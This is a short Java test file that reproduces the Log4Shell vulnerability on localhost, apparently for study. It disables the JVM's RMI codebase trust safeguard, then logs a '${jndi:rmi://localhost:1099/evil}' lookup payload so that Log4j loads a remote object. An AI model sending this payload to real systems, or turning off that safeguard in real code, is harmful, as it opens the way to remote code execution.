package com.lx;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @Author: Xin Liu
 * @Date: 2022/2/14
 */
public class Log4j2Test {
    private static final Logger LOGGER= LogManager.getLogger(Log4j2Test.class);

    public static void main(String[] args) {
        // 解决报错 The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        String userName="${jndi:rmi://localhost:1099/evil}";

        LOGGER.info("Hello,{}",userName);
    }
}